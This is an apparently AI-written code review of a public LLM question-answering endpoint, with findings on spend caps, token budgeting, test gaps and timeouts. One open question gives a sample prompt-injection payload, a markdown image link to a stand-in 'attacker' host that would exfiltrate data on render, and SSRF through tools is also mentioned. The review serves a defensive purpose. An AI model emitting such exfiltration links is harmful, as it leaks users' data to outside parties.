**Review mode:** independent reviewer. I did not author this work, and no tools were available in this session. Every trace below was done by reading the code by hand. Nothing was executed, and every reproduction is a traced script, not a run result.

---

**VERDICT: SHIP WITH FIXES.** The per-request turn, input and tool-result caps work as written. However, a public, per-token-billed endpoint has no ceiling on total spend, and the token cap only fires after the money is spent. One unresolved question, where `request["user"]` comes from, could raise this to REJECT.

**CONFIDENCE: medium.** It is limited by four things:
- No tools: I could not run the tests or mutations.
- The LLM wrapper was not supplied.
- The tool set was not supplied.
- The HTTP/auth layer was not supplied.

**INPUTS LEDGER**

Seen:
- request.md
- context.md
- agent.py
- test_agent.py

Not seen:

| Missing input | Matters? | Why |
|---|---|---|
| `llm` wrapper | yes | It decides whether `tokens` is reported, the output limit, timeouts and retries. |
| `tools` dict | yes | It decides what public input can make the server do. |
| HTTP/auth layer that builds `request` | yes, decisively | It decides whether `user` is authenticated or supplied by the client. |
| Answer renderer | yes | It decides whether model output is rendered as markdown or HTML. |
| Server concurrency model | yes | It decides whether the rate-limit check races. |
| Test run output | partially | "6 pass" is taken on assertion. |

**COVERAGE**

Scope is the whole work: two files.

Checked:
- request.md and context.md
- agent.py: constants, `run_agent`, `ask_endpoint`, `BudgetExceeded`
- test_agent.py: all 6 tests
- The docstring claims "input, turn, token and request caps", "one process", and "signed-in users only"

Not checked:
- The wrapper, tools, auth layer and renderer: not supplied.
- Executing tests or mutations: no tools.

**SEATS AND GATE**

This reviewer ran. No cross-vendor seats were requested, and the depth is standard. The sensitivity gate passed: the work contains no personal data, credentials or client material.

---

**FINDINGS**

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | High | CONFIRMED | B/D | agent.py:5-10, 46-49 | Every cap is per request or per user. Nothing bounds total spend across users, per IP, or per day. | Someone with K accounts (scripted signups, or many legitimate users on launch day) can drive about K × 20 req/h × ~20k+ tokens/h. The only ceiling is how fast one process can work. If calls take ~10s, that is about 7M tokens/hour, billed to your account, with nothing to stop it. | **Fix:** add a global token/cost budget (hourly and daily) checked before each `llm` call, plus per-IP limiting and an alert, and fail closed when it is exhausted. **Repro (traced):** loop `ask_endpoint({"user": f"u{i}", "question": "q"}, llm, tools)` for i in 0..999 with a stub reporting 15000 tokens per call. All 1000 requests return answers (15M tokens). Expected: refusal once a global budget is hit. | a✓ b✓ c✗ d✓ |
| F2 | Medium | CONFIRMED | B | agent.py:25-28 | The token cap is checked after each call is made and billed. No output limit is passed to `llm(messages)`. | When cumulative spend is 19,999 before a call, that call (whose size is limited only by the wrapper's default) runs in full. The real per-request bound is 20,000 plus one whole call. When the final answering reply crosses the cap, the answer is thrown away after it has been paid for. | **Fix:** pass `max_tokens = remaining budget` to `llm`, and refuse to call when the remaining budget is below the expected input size. **Repro (traced):** replies `[{"tool":"t","tokens":19000},{"answer":"a","tokens":15000}]` give total spend 34,000, and the caller gets `{"error":"token budget for this request"}`. | a✓ b✓ c✗ d✗ |
| F3 | Medium | CONFIRMED | B | agent.py:26 | `reply.get("tokens", 0)` fails open. A reply that does not report `tokens` counts as free. | If the wrapper reports usage under another key (for example `usage.total_tokens`), or omits it on some path (errors, streaming), `spent` stays 0. Only the 6-turn limit then bounds spend. | **Fix:** require the field (`reply["tokens"]`), or fall back to a conservative estimate. Treat a missing value as over budget. **Repro (traced):** with replies lacking `tokens`, six 100k-token calls run with no `BudgetExceeded("token budget…")`. | a✓ b✓ c✗ d✗ |
| F4 | Medium | CONFIRMED | B | test_agent.py:6-11 (and suite) | No test exercises the token cap or the rate-limit window expiry. The "never stops" test uses 10 tokens × 6 = 60, so it hits the turn limit. | Deleting agent.py:27-28 would leave all 6 tests green, so the cap the context relies on is unguarded. | **Fix:** add a test whose stub reports 15000 tokens per call and that asserts the error is `"token budget for this request"` after 2 calls. Add a rate-limit test that advances `now` past 3600 and asserts the request is accepted again. **Mutation to confirm:** remove lines 27-28 and run the suite; I traced that it stays green. | a✓ b✓ c✗ d✗ |
| F5 | Medium | PROBABLE | B | agent.py:25, 32 | There is no timeout or wall-clock bound on `llm(...)` or on tool calls. | If a tool hangs (a slow URL, a stuck DB), the request never finishes. In the "one process" deployment, a signed-in user can hold workers, or the whole endpoint if it is single-threaded, by asking questions that steer the model to a slow tool. | **Fix:** apply a per-call timeout and a per-request deadline, and raise `BudgetExceeded("time limit")`. **Repro (traced):** use a tool `lambda: time.sleep(10**6)` with a stub that calls it; `ask_endpoint` does not return. | a✓ b✗ c✗ d✗ |
| F6 | Low | CONFIRMED | B | agent.py:37, 51-53 | Only `BudgetExceeded` is caught. These all propagate as unhandled exceptions after the rate-limit slot is consumed: a reply with neither `tool` nor `answer` (KeyError), any wrapper exception, and a request without `"question"` (KeyError). | A model reply missing `answer`, or an API outage, produces a 500. Depending on the framework, it may include a traceback. | **Fix:** validate the reply shape, and catch wrapper errors into a generic `{"error": ...}`. **Repro (traced):** stub `lambda m: {"tokens": 1}` raises `KeyError: 'answer'` out of `ask_endpoint`. | a✓ b✓ c✗ d✗ |
| F7 | Low | PROBABLE | B | agent.py:33-34 | Raw tool exception text is fed back to the model, which may quote it in the public answer. | A tool error carrying an internal hostname, file path or connection string reaches an anonymous reader. | **Fix:** return a generic `"tool failed"` to the model and log the detail server-side. **Repro (traced):** a tool raising `Exception("db=postgres://internal:5432")` puts that string verbatim in `messages`. | a✓ b✗ c✗ d✗ |
| F8 | Low | CONFIRMED | B | agent.py:10, 49 | `_seen` keys are never evicted. The limiter state is in-process, so it resets on restart and is not shared if a second process is added. | Memory grows with distinct users over the process lifetime. Each restart gives every user a fresh 20. | **Fix:** periodically evict expired keys, or move the limiter to shared storage (for example Redis). **Repro (traced):** after requests from N distinct users, `len(agent._seen) == N` forever. | a✓ b✓ c✗ d✗ |
| F9 | Low | CONFIRMED | B | test_agent.py:10 | `assertIn("error", r)` passes for any error, including `"rate limit"`, which can occur without the model ever being called. | If the `_seen` state for `u1` were exhausted, the test would pass without testing the turn limit. | **Fix:** `assertEqual(r, {"error": "turn limit"})` and `assertEqual(len(calls), agent.MAX_TURNS)`. **Repro (traced):** pre-fill `_seen["u1"]` with 20 current timestamps; the test passes with `calls == []`. | a✓ b✓ c✗ d✗ |

**Confirm-or-refute on F1**

The defender's case is "per-user limits plus login suffice". F1 survives that defense for three reasons:
- The code has no aggregate ceiling, which I confirmed by reading every constant and every use of `_seen`.
- The single process bounds spend only incidentally, at roughly millions of tokens per hour.
- Account creation cost is unknown, so login is not a spend control.

**Sibling search for F1**

I checked every `MAX_*` constant, `_seen`, and every limit check in agent.py and test_agent.py. All are scoped to one request or one user, and there is no global counter. F1 is classed as a security (abuse/cost) finding:
- Principal: any signed-in internet user, or the holder of many accounts.
- Input: POST /ask.
- Failing control: the per-user limiter is the only control.
- Boundary crossed: public user to the organization's billing account.
- Resource: model spend.

**NEEDS VALIDATION** (no severity)

- **N1, agent.py:43.** Is `request["user"]` set by trusted auth middleware, or parsed from the client body or headers? If it is client-controlled, anyone sets `"user": "<random>"` and bypasses both login and the rate limit. That would be Critical.
- **N2, agent.py:32.** What tools exist? Public question text steers the model, which chooses the tool name and `**args`. A URL-fetch tool means SSRF to internal or metadata addresses; a write-capable tool means side effects for anyone.
- **N3, agent.py:51.** Is the answer rendered as markdown or HTML? A prompt-injected answer containing `![](https://attacker/?d=...)` would exfiltrate data on render.
- **N4.** Does the `llm` wrapper retry internally? Retries would multiply spend outside `spent`.
- **N5, agent.py:46-49.** Is the server threaded? With threads, concurrent requests from one user can all pass the check before any of them writes, so the limit races.
- **N6, request.md.** Does "public /ask endpoint" mean anonymous access was intended? If so, the login requirement is drift from the request, and the per-user limit cannot apply.

**REFUTED**

- **Non-string question bypassing the length cap:** the `isinstance` check at line 18 refuses it before any model call.
- **Unknown tool name crashing the agent:** the KeyError at line 32 is caught by `except Exception` and becomes `"error: 't'"`.
- **Off-by-one in the turn limit:** `range(6)` allows at most 6 `llm` calls.
- **`u4` reused across two tests causing rate-limit interference:** that is only 2 requests, under the 20 limit.
- **Truncating JSON mid-string:** the result is text for the model, and that is harmless.

**WHAT HOLDS UP**

- The input type and length checks run before any model call.
- The hard turn limit works.
- Tool results are truncated, error strings included.
- Anonymous requests are refused.
- The rate-limit slot is recorded before the work, so failed requests still count.
- Tool exceptions do not crash the loop.

**UNVERIFIED CLAIMS**

- **"6 tests pass":** run `python -m unittest test_agent` in an isolated copy.
- **"Signed-in users only":** inspect the request construction (N1).
- **"Token cap":** read the wrapper's usage field (F3, N4).
- **"One process serves the endpoint":** check the deployment configuration.

**QUESTIONS FOR THE AUTHOR**

1. Where does `request["user"]` come from?
2. What are the tools, and what do they reach?
3. Should "public" allow anonymous users?
4. What does the `llm` wrapper return for usage, and does it retry?

**DECISION-MAKER SUMMARY**

Do not announce until there is a global spend cap with alerting and the token budget is enforced before calls (F1-F3). Confirm that the user identity comes from real authentication (N1). If you proceed as is, your token bill is bounded only by how many accounts an abuser can create and how fast one process runs.

**OWNER SUMMARY**

The question-answering service limits each single request and each user, but nothing limits the total cost if many accounts use it at once, so the bill could run away after launch. The per-request cost limit also checks only after money has been spent. Add an overall spending ceiling and confirm that sign-in is really enforced before announcing.

```json
{
  "schema_version": "2.3",
  "verdict": "SHIP WITH FIXES",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "agent.py", "status": "seen", "matters": true},
    {"item": "test_agent.py", "status": "seen", "matters": true},
    {"item": "llm wrapper", "status": "not_seen", "matters": true},
    {"item": "tools implementations", "status": "not_seen", "matters": true},
    {"item": "HTTP/auth layer building request", "status": "not_seen", "matters": true},
    {"item": "answer renderer", "status": "not_seen", "matters": true},
    {"item": "test run output", "status": "not_seen", "matters": false}
  ],
  "seats": [{"vendor": "claude-independent-reviewer", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": "no personal data, credentials or client material in the work"},
  "coverage": {
    "checked": [
      {"unit": "request.md", "kind": "document"},
      {"unit": "context.md", "kind": "document"},
      {"unit": "agent.py", "kind": "file"},
      {"unit": "agent.py:run_agent", "kind": "function"},
      {"unit": "agent.py:ask_endpoint", "kind": "function"},
      {"unit": "test_agent.py", "kind": "file"},
      {"unit": "docstring claim: input, turn, token and request caps", "kind": "claim"},
      {"unit": "docstring claim: signed-in users only", "kind": "claim"},
      {"unit": "assumption: one process serves the endpoint", "kind": "assumption"}
    ],
    "not_checked": [
      {"unit": "llm wrapper", "reason": "not_supplied"},
      {"unit": "tools implementations", "reason": "not_supplied"},
      {"unit": "HTTP/auth layer", "reason": "not_supplied"},
      {"unit": "answer renderer", "reason": "not_supplied"},
      {"unit": "executing test_agent.py and mutations", "reason": "no_tools"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "High", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:5-10, 46-49",
     "scenario": "All caps are per request or per user; with many accounts (scripted signups or launch traffic) total spend is about K x 20 req/h x ~20k tokens with no ceiling except single-process throughput, billed to the organization.",
     "fix": "Add a global hourly/daily token or cost budget checked before every llm call, per-IP limiting and an alert; fail closed when exhausted.",
     "answers": {"a": true, "b": true, "c": false, "d": true},
     "reproduction": "Traced, not executed: for i in range(1000) call ask_endpoint({'user': f'u{i}', 'question': 'q'}, llm, tools) with a stub reporting 15000 tokens; all 1000 succeed (15M tokens); expected refusal after a global budget.",
     "security": true,
     "boundary": {"principal": "any signed-in internet user or holder of many accounts", "input": "POST /ask requests",
                  "control": "only a per-user in-memory limiter; no aggregate budget", "crossed": "public user to organization billing",
                  "resource": "model token spend on the organization's account"},
     "siblings_searched": {"searched": "every MAX_* constant, _seen and every limit check in agent.py and test_agent.py",
                           "found": "all limits are per-request or per-user; no global counter anywhere"}},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:25-28",
     "scenario": "Token cap is checked after the call is billed and no max output is passed to llm; a request at 19,999 tokens makes one more unbounded call, and an answer crossing the cap is discarded after being paid for.",
     "fix": "Pass max_tokens equal to the remaining budget to llm and refuse to call when the remaining budget is below the expected input size.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Traced, not executed: replies [{'tool':'t','tokens':19000},{'answer':'a','tokens':15000}] give total spend 34000 and the result {'error': 'token budget for this request'}."},
    {"id": "F3", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:26",
     "scenario": "reply.get('tokens', 0) fails open: if the wrapper reports usage under another key or omits it, spent stays 0 and only the 6-turn limit bounds spend.",
     "fix": "Require the tokens field or use a conservative estimate; treat a missing value as over budget.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Traced, not executed: a stub returning {'tool':'t'} without 'tokens' six times never raises the token-budget error; it ends with 'turn limit'."},
    {"id": "F4", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_agent.py:6-11",
     "scenario": "No test exercises the token cap (60 tokens total in the never-stops test) or rate-limit window expiry; deleting agent.py:27-28 leaves all 6 tests green.",
     "fix": "Add a test with 15000 tokens per call asserting 'token budget for this request' after 2 calls, and a test advancing now past 3600 that asserts acceptance.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Mutation, traced not executed: remove agent.py lines 27-28 and run python -m unittest test_agent; all 6 still pass."},
    {"id": "F5", "status": "confirmed", "severity": "Medium", "evidence_level": "PROBABLE", "track": "B",
     "location": "agent.py:25, 32",
     "scenario": "No timeout on llm or tool calls; a hanging tool keeps the request open indefinitely, and in a single-process deployment a user can occupy workers or the whole endpoint.",
     "fix": "Per-call timeouts and a per-request wall-clock deadline raising BudgetExceeded('time limit').",
     "answers": {"a": true, "b": false, "c": false, "d": false},
     "reproduction": "Traced, not executed: tool lambda: time.sleep(10**6) with a stub that calls it; ask_endpoint never returns."},
    {"id": "F6", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:37, 51-53",
     "scenario": "A reply with neither tool nor answer, a wrapper exception, or a request without 'question' raises an unhandled exception (500) after the rate-limit slot is consumed.",
     "fix": "Validate reply shape and request fields; catch wrapper errors into a generic error response.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Traced, not executed: stub lambda m: {'tokens': 1} makes ask_endpoint raise KeyError: 'answer'."},
    {"id": "F7", "status": "confirmed", "severity": "Low", "evidence_level": "PROBABLE", "track": "B",
     "location": "agent.py:33-34",
     "scenario": "Raw tool exception text goes to the model and may be echoed to a public user, leaking internal hosts, paths or connection strings.",
     "fix": "Return a generic 'tool failed' to the model; log details server-side.",
     "answers": {"a": true, "b": false, "c": false, "d": false},
     "reproduction": "Traced, not executed: a tool raising Exception('db=postgres://internal:5432') puts that string verbatim in messages."},
    {"id": "F8", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:10, 49",
     "scenario": "_seen keys are never evicted, so memory grows with distinct users; limiter state resets on restart and is not shared across processes.",
     "fix": "Evict expired keys periodically or use a shared store.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Traced, not executed: after requests from N distinct users, len(agent._seen) == N for the process lifetime."},
    {"id": "F9", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_agent.py:10",
     "scenario": "assertIn('error', r) also passes on 'rate limit', so the turn-limit test can pass without the model being called.",
     "fix": "Assert r == {'error': 'turn limit'} and len(calls) == MAX_TURNS.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Traced, not executed: pre-fill agent._seen['u1'] with 20 current timestamps; the test passes with calls == []."},
    {"id": "N1", "status": "needs_validation", "track": "B", "location": "agent.py:43",
     "suspicion": "If request['user'] is client-supplied, anyone bypasses login and the rate limit by sending a random user value.",
     "unresolved_fact": "Whether the auth middleware sets request['user'] from a verified session or token."},
    {"id": "N2", "status": "needs_validation", "track": "B", "location": "agent.py:32",
     "suspicion": "Public input steers model-chosen tool names and arguments; a fetch or write tool enables SSRF or side effects.",
     "unresolved_fact": "The list of tools and their capabilities and network reach."},
    {"id": "N3", "status": "needs_validation", "track": "B", "location": "agent.py:51",
     "suspicion": "A prompt-injected answer rendered as markdown or HTML could exfiltrate data through image links.",
     "unresolved_fact": "How the client renders the answer."},
    {"id": "N4", "status": "needs_validation", "track": "B", "location": "agent.py:25",
     "suspicion": "Internal retries in the wrapper would multiply spend outside the counted tokens.",
     "unresolved_fact": "Whether the llm wrapper retries and what it reports in tokens."},
    {"id": "N5", "status": "needs_validation", "track": "B", "location": "agent.py:46-49",
     "suspicion": "Under threaded serving, concurrent requests from one user can all pass the check before any write.",
     "unresolved_fact": "The server's concurrency model (threads vs async vs single-threaded)."},
    {"id": "N6", "status": "needs_validation", "track": "D", "location": "request.md; agent.py:42-45",
     "suspicion": "'Public /ask endpoint' may mean anonymous access; requiring login would then be drift.",
     "unresolved_fact": "Whether the requester intended anonymous use."}
  ],
  "refuted": [
    {"id": "C1", "candidate": "A non-string question bypasses the length cap.", "evidence": "The isinstance check at agent.py:18 refuses it before any model call."},
    {"id": "C2", "candidate": "An unknown tool name crashes the agent.", "evidence": "The KeyError at agent.py:32 is caught by except Exception at line 33."},
    {"id": "C3", "candidate": "Off-by-one in the turn limit.", "evidence": "range(MAX_TURNS) at agent.py:24 allows at most 6 llm calls."},
    {"id": "C4", "candidate": "Reusing user u4 across two tests trips the rate limit.", "evidence": "That is only 2 requests, under MAX_REQUESTS_PER_HOUR = 20."},
    {"id": "C5", "candidate": "Truncation at agent.py:35 breaks JSON.", "evidence": "The content is text consumed by the model, not parsed; no failure path."}
  ]
}
```